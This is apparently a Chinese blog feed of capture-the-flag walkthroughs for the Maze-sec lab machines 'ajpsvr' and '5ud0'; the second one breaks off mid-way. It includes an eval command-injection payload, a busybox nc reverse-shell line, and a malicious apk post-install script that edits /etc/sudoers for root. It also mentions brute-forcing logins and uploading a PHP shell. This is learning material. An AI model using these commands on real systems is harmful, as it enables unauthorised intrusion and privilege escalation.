class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# curl http://192.168.2.4:8000/login?password=%21%40%23%24%25<br>/backdoooooooooooooooooor<br></code></pre></td></tr></table></figure><p>访问路径<code>/backdoooooooooooooooooor</code>，并尝试传入<code>cmd</code>参数执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# curl http://192.168.2.4:8000/backdoooooooooooooooooor?cmd=<span class="hljs-built_in">id</span><br>&lt;built-in <span class="hljs-keyword">function</span> <span class="hljs-built_in">id</span>&gt; <br></code></pre></td></tr></table></figure><p>返回结果 <code>&lt;built-in function id&gt;</code> 表明后端很可能使用了 Python 的 <code>eval()</code> 或类似函数来执行代码，并且没有导入 <code>os</code> 模块。为了执行系统命令，我们需要先导入 <code>os</code> 模块。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# curl <span class="hljs-string">&#x27;http://192.168.2.4:8000/backdoooooooooooooooooor?cmd=__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;</span><br>uid=1000(welcome) gid=1000(welcome) <span class="hljs-built_in">groups</span>=1000(welcome)<br></code></pre></td></tr></table></figure><p>成功执行</p><h2 id="3、反弹shell"><a href="#3、反弹shell" class="headerlink" title="3、反弹shell"></a>3、反弹shell</h2><p> 通过 URL 发送反弹 Shell 的 payload（注意 <code>+</code> 在 URL 中会被视为空格，这里是 <code>busybox</code> 多功能二进制文件的用法）<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# curl <span class="hljs-string">&#x27;http://192.168.2.4:8000/backdoooooooooooooooooor?cmd=__import__(&quot;os&quot;).popen(&quot;busybox+nc+192.168.2.4+4444+-e+/bin/bash&quot;).read()&#x27;</span> <br></code></pre></td></tr></table></figure></p><p>成功获取到shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nc -lvnp 4444<br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.59] 44001<br><span class="hljs-built_in">id</span><br>uid=1000(welcome) gid=1000(welcome) <span class="hljs-built_in">groups</span>=1000(welcome)<br></code></pre></td></tr></table></figure><h2 id="4、稳定shell"><a href="#4、稳定shell" class="headerlink" title="4、稳定shell"></a>4、稳定shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>Ctrl+Z<br><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span><br>reset xterm  <br><span class="hljs-built_in">export</span> TERM=xterm  <br><span class="hljs-built_in">export</span> SHELL=/bin/bash  <br><span class="hljs-built_in">stty</span> rows 24 columns 80<br></code></pre></td></tr></table></figure><p><strong>USER FLAG</strong><br>在<code>welcome</code>用户的<code>/home</code>目录下，找到FLAG</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">localhost:~$ <span class="hljs-built_in">cat</span> user.txt <br>flag&#123;5a80870310e5a3bc10c00ef6d20a3cac&#125;<br></code></pre></td></tr></table></figure><h1 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h1><h2 id="1、提权至superuser"><a href="#1、提权至superuser" class="headerlink" title="1、提权至superuser"></a>1、提权至superuser</h2><p>在枚举系统时，发现一个只监听在本地 <code>127.0.0.1:5000</code> 的可疑服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">localhost:~$ netstat -lntup<br>netstat: showing only processes with your user ID<br>Active Internet connections (only servers)<br>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    <br>tcp        0      0 0.0.0.0:8010            0.0.0.0:*               LISTEN      2850/python3<br>tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -<br>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -<br>tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -<br>tcp        0      0 :::22                   :::*                    LISTEN      -<br>tcp        0      0 :::80                   :::*                    LISTEN      -<br></code></pre></td></tr></table></figure><p>访问<code>5000</code>端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">localhost:~$ busybox nc 127.0.0.1 5000<br>Welcome to SignatureChain CTF over TCP!<br>Type <span class="hljs-string">&#x27;view&#x27;</span>, <span class="hljs-string">&#x27;submit&#x27;</span>, <span class="hljs-string">&#x27;hint&#x27;</span>, or <span class="hljs-string">&#x27;exit&#x27;</span><br>&gt; view<br>[<br>  &#123;<br>    <span class="hljs-string">&quot;index&quot;</span>: 1,<br>    <span class="hljs-string">&quot;sender&quot;</span>: <span class="hljs-string">&quot;system&quot;</span>,<br>    <span class="hljs-string">&quot;recipient&quot;</span>: <span class="hljs-string">&quot;alice&quot;</span>,<br>    <span class="hljs-string">&quot;amount&quot;</span>: 100,<br>    <span class="hljs-string">&quot;signature&quot;</span>: <span class="hljs-string">&quot;14ed219616014b683ae66d1ec2e098c84ff09695b33fff0a7652505e260be0aa&quot;</span>,<br>    <span class="hljs-string">&quot;note&quot;</span>: <span class="hljs-string">&quot;1&quot;</span><br>  &#125;,<br>  &#123;<br>    <span class="hljs-string">&quot;index&quot;</span>: 2,<br>    <span class="hljs-string">&quot;sender&quot;</span>: <span class="hljs-string">&quot;alice&quot;</span>,<br>    <span class="hljs-string">&quot;recipient&quot;</span>: <span class="hljs-string">&quot;bob&quot;</span>,<br>    <span class="hljs-string">&quot;amount&quot;</span>: 50,<br>    <span class="hljs-string">&quot;signature&quot;</span>: <span class="hljs-string">&quot;08188ce485e280ba7d8c614a776a478d75ac2e985a535d1d126117ceb59ac952&quot;</span>,<br>    <span class="hljs-string">&quot;note&quot;</span>: <span class="hljs-string">&quot;2&quot;</span><br>  &#125;<br>]<br>&gt; hint<br>[Hint 1] Use <span class="hljs-string">&#x27;view&#x27;</span> to inspect part of the blockchain.<br>[Hint 2] The signature is just sha256(sender-&gt;recipient:amount).<br>[Hint 3] Try forging a valid signature with this knowledge.<br>[Hint 4] What <span class="hljs-keyword">if</span> admin sent you 999 coins?<br></code></pre></td></tr></table></figure><ol><li>使用 <code>view</code> 查看区块链的一部分</li><li>签名就是 <code>sha256(sender-&gt;recipient:amount)</code></li><li>试着用这些知识伪造一个有效的签名</li><li>如果管理员给你发送了 999 枚硬币呢？</li></ol><p>在<code>/opt/server/server.py</code>中找到代码的硬编码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">localhost:/opt/server$ <span class="hljs-built_in">cat</span> server.py <br>import socket<br>import threading<br>import json<br>import hashlib<br><br>FLAG = <span class="hljs-string">&quot;flag&#123;superuser/f124cf868d5e3fa5a7de39f80a2f9a0e&#125;&quot;</span><br>.......<br></code></pre></td></tr></table></figure><p>代码里面<code>FLAG = &quot;flag&#123;superuser/f124cf868d5e3fa5a7de39f80a2f9a0e&#125;&quot;</code>，猜测用户<code>superuser</code>的密码为<code>f124cf868d5e3fa5a7de39f80a2f9a0e</code></p><p>切换用户成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">localhost:/opt/server$ su superuser<br>Password: <br>/opt/server $ <span class="hljs-built_in">id</span><br>uid=1001(superuser) gid=1001(superuser) <span class="hljs-built_in">groups</span>=300(abuild),1001(superuser)<br></code></pre></td></tr></table></figure><h2 id="2、提权至root"><a href="#2、提权至root" class="headerlink" title="2、提权至root"></a>2、提权至root</h2><p>检查<code>sudo</code>权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">/home $ <span class="hljs-built_in">sudo</span> -l<br>User superuser may run the following commands on localhost:<br>    (ALL) NOPASSWD: /sbin/apk<br></code></pre></td></tr></table></figure><p>我们可以无需密码以 root 权限运行 <code>apk</code> 命令。<code>apk</code> 是 Alpine Linux 的包管理器。我们可以创建一个包含恶意安装后脚本的自定义 <code>.apk</code> 包，然后用 <code>sudo apk</code> 来安装它。该脚本将以 root 权限执行。</p><p><strong>提权步骤：</strong></p><ol><li><strong>创建恶意包工作目录和文件</strong><ul><li><code>APKBUILD</code>：定义包名、版本等元信息。</li><li><code>pwn.post-install</code>：安装后要执行的脚本。我们可以在这里写入提权命令。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建工作目录</span><br><span class="hljs-built_in">mkdir</span> /tmp/malicious-pkg<br><span class="hljs-built_in">cd</span> /tmp/malicious-pkg<br><br><span class="hljs-built_in">cat</span> &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span> &gt; APKBUILD<br>pkgname=pwn<br>pkgver=1.0.0<br>pkgrel=0<br>pkgdesc=<span class="hljs-string">&quot;pwn&quot;</span><br><span class="hljs-built_in">arch</span>=<span class="hljs-string">&quot;noarch&quot;</span><br>license=<span class="hljs-string">&quot;GPL&quot;</span><br>install=<span class="hljs-string">&quot;pwn.post-install&quot;</span><br><span class="hljs-function"><span class="hljs-title">package</span></span>() &#123;<br>    <span class="hljs-built_in">mkdir</span> -p <span class="hljs-string">&quot;<span class="hljs-variable">$pkgdir</span>&quot;</span><br>&#125;<br>EOF<br><br><span class="hljs-comment"># 写入恶意安装后脚本 (例如：给予 superuser 完全的 sudo 权限)</span><br><span class="hljs-built_in">cat</span> &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span> &gt; pwn.post-install<br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;superuser ALL=(ALL:ALL) NOPASSWD: ALL&#x27;</span> &gt;&gt; /etc/sudoers<br>EOF<br></code></pre></td></tr></table></figure></li></ul></li></ol><p><strong>2.生成签名密钥并构建包</strong></p><ul><li><code>abuild</code> 工具需要签名密钥来构建包。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 生成密钥对</span><br>abuild-keygen -a<br><span class="hljs-comment"># 构建包</span><br>abuild checksum<br>abuild -r<br></code></pre></td></tr></table></figure></li></ul><p> <strong>3.安装恶意包并提权</strong></p><ul><li>使用 <code>sudo apk add</code> 并加上 <code>--allow-untrusted</code> 选项来安装我们自己构建的未签名包。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apk add --allow-untrusted /home/superuser/packages/tmp/x86_64/pwn-1.0.0-r0.apk <br></code></pre></td></tr></table></figure>安装过程中，<code>pwn.post-install</code> 脚本会被 root 执行，<code>superuser</code> 用户现在拥有了无密码执行任何 <code>sudo</code> 命令的权限。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">localhost:/tmp/malicious-pkg$ <span class="hljs-built_in">sudo</span> -l<br>User superuser may run the following commands on localhost:<br>    (ALL) NOPASSWD: /sbin/apk<br>    (ALL : ALL) NOPASSWD: ALL<br></code></pre></td></tr></table></figure></li></ul><p>4.获取ROOT shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">localhost:/tmp/malicious-pkg$ <span class="hljs-built_in">sudo</span> su<br>/tmp/malicious-pkg <span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),...<br></code></pre></td></tr></table></figure><p><strong>ROOT FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/tmp/malicious-pkg <span class="hljs-comment"># cat /root/root.txt</span><br>flag&#123;bd941f8fb8a7b5b1c34bd71a349d6d04&#125;<br></code></pre></td></tr></table></figure><h1 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h1><h2 id="1、AJP服务"><a href="#1、AJP服务" class="headerlink" title="1、AJP服务"></a>1、AJP服务</h2><p><strong>什么是 AJP？</strong></p><ul><li>AJP服务是指基于Apache JServ Protocol（AJP）协议的应用服务，主要用于Web服务器与Servlet容器（如Tomcat）之间的高效通信。</li><li>AJP是一种<strong>定向包协议</strong>，通过<strong>二进制格式</strong>传输数据（而非HTTP的纯文本），旨在提升Web服务器与应用服务器间的通信效率。它允许Web服务器（如Apache HTTP Server）将请求转发给后端的Servlet容器处理，常用于负载均衡或反向代理场景。&#96;</li></ul><p><strong>代理配置步骤：</strong></p><ol><li>启用Apache的相关代理模块<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get install apache2<br><span class="hljs-built_in">sudo</span> a2enmod proxy    <br><span class="hljs-built_in">sudo</span> a2enmod proxy_http<br><span class="hljs-built_in">sudo</span> a2enmod proxy_ajp        <br></code></pre></td></tr></table></figure></li><li>创建一个新的 Apache 站点配置文件 <code>/etc/apache2/sites-available/ajp-proxy.conf</code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Listen 8000<br>&lt;VirtualHost *:8000&gt;<br>    ProxyPass / ajp://192.168.2.59:8010/<br>    ProxyPassReverse / ajp://192.168.2.59:8010/<br>&lt;/VirtualHost&gt;<br></code></pre></td></tr></table></figure></li><li>启用该站点并重启 Apache 服务<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> a2ensite ajp-proxy.conf<br><span class="hljs-built_in">sudo</span> systemctl restart apache2<br></code></pre></td></tr></table></figure></li></ol><p>配置完成后，访问我们自己机器的 <code>http://127.0.0.1:8000</code> (或 <code>http://192.168.2.4:8000</code>) 就相当于在访问目标 <code>192.168.2.59:8010</code> 上的 Web 应用</p><h2 id="2、提权-apk"><a href="#2、提权-apk" class="headerlink" title="2、提权-apk"></a>2、提权-apk</h2><p><code>apk</code> 是 Alpine Linux 的包管理器。我们可以创建一个包含恶意安装后脚本的自定义 <code>.apk</code> 包，然后用 <code>sudo apk</code> 来安装它。该脚本将以 root 权限执行。</p>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ajp服务，sudo-apk</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>5ud0</title>
    <link href="/Maze-sec/5ud0/"/>
    <url>/Maze-sec/5ud0/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p>QQ群：<code>660930334</code></p><h1 id="一、主机探测"><a href="#一、主机探测" class="headerlink" title="一、主机探测"></a>一、主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/5ud0]<br>└─# nmap -sn 192.168.2.0/24              <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-15 15:41 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00043s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00079s latency).<br>MAC Address: 08:00:27:0E:81:B3 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.58<br>Host is up (0.00071s latency).<br>MAC Address: 08:00:27:23:05:B0 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.06 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.58</code></p><h1 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/5ud0]<br>└─# nmap --min-rate 10000 -p- 192.168.2.58                   <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-15 15:42 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.58<br>Host is up (0.00085s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:23:05:B0 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 5.79 seconds<br></code></pre></td></tr></table></figure><p>开放端口<code>22,80</code></p><h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/5ud0]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.58<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-15 15:43 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.58<br>Host is up (0.00064s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 10.0p2 Debian 5 (protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-title: My site<br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-generator: Textpattern CMS<br>MAC Address: 08:00:27:23:05:B0 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.44 seconds<br></code></pre></td></tr></table></figure><p>系统框架<code>Textpattern CMS 4.8.7</code></p><h2 id="3、UDP端口扫描"><a href="#3、UDP端口扫描" class="headerlink" title="3、UDP端口扫描"></a>3、UDP端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/5ud0]<br>└─# nmap -sU --top-ports 100 192.168.2.58                    <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-15 15:43 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.58<br>Host is up (0.00057s latency).<br>All 100 scanned ports on 192.168.2.58 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 61 closed udp ports (port-unreach), 39 open|filtered udp ports (no-response)<br>MAC Address: 08:00:27:23:05:B0 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 57.68 seconds<br></code></pre></td></tr></table></figure><p>没有开放的端口</p><h1 id="三、WEB渗透"><a href="#三、WEB渗透" class="headerlink" title="三、WEB渗透"></a>三、WEB渗透</h1><p>访问80端口，找到一个域名<code>textpattern.dsz</code>，追加至<code>hosts</code>文件<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507151549137.png"></p><p>找到一个登录框<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507151644685.png"></p><h2 id="1、密码爆破"><a href="#1、密码爆破" class="headerlink" title="1、密码爆破"></a>1、密码爆破</h2><p>尝试进行密码爆破，成功找到用户名和密码<code>admin:superman</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507151645835.png"></p><h2 id="2、文件上传"><a href="#2、文件上传" class="headerlink" title="2、文件上传"></a>2、文件上传</h2><p>找到上传文件点，上传shell，获得文件上传后的路径<code>/files/rev.php</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507151628820.png"></p><h2 id="3、获取www-data权限"><a href="#3、获取www-data权限" class="headerlink" title="3、获取www-data权限"></a>3、获取www-data权限</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/5ud0]<br>└─# nc -lvnp 4444     <br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.58] 44504<br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/usr/bin/script -qc /bin/bash /dev/null<br>www-data@5ud0:/var/www/html/files$ ^Z <br>zsh: suspended  nc -lvnp 4444<br>                                                                                                                                               <br>┌──(root㉿kali)-[/miao/maze-sec/5ud0]<br>└─# <span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>;<span class="hljs-built_in">fg</span><br>[1]  + continued  nc -lvnp 4444<br>                               reset<br>reset: unknown terminal <span class="hljs-built_in">type</span> unknown<br>Terminal <span class="hljs-built_in">type</span>? xterm<br>www-data@5ud0:/var/www/html/files$ uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure><p><strong>USER FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@5ud0:/home/todd$ <span class="hljs-built_in">cat</span> user.txt <br>flag&#123;user-80e68759-1ca0-45eb-82a7-601b1f78dfe5&#125;<br></code></pre></td></tr></table></figure><h1 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h1><h2 id="CVE-2025-32463-sudo提权"><a href="#CVE-2025-32463-sudo提权" class="headerlink" title="CVE-2025-32463-sudo提权"></a>CVE-2025-32463-sudo提权</h2><p>查看具有<code>suid</code>权限的文件，发现存在两个<code>sudo</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@5ud0:/var/www/html/files$ find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>/usr/bin/chsh<br>/usr/bin/chfn<br>/usr/bin/newgrp<br>/usr/bin/gpasswd<br>/usr/bin/mount<br>/usr/bin/su<br>/usr/bin/umount<br>/usr/bin/pkexec<br>/usr/bin/sudo<br>/usr/bin/passwd<br>/usr/local/bin/sudo<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/openssh/ssh-keysign<br>/usr/libexec/polkit-agent-helper-1<br></code></pre></td></tr></table></figure><p>查看当前系统使用的哪个<code>sudo</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@5ud0:/var/www/html/files$ <span class="hljs-built_in">which</span> <span class="hljs-built_in">sudo</span><br>/usr/local/bin/sudo<br></code></pre></td></tr></table></figure><p>查看<code>sudo</code>的版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@5ud0:/var/www/html/files$ /usr/local/bin/sudo -V<br>Sudo version 1.9.6<br>Sudoers policy plugin version 1.9.6<br>Sudoers file grammar version 48<br>Sudoers I/O plugin version 1.9.6<br>Sudoers audit plugin version 1.9.6<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td 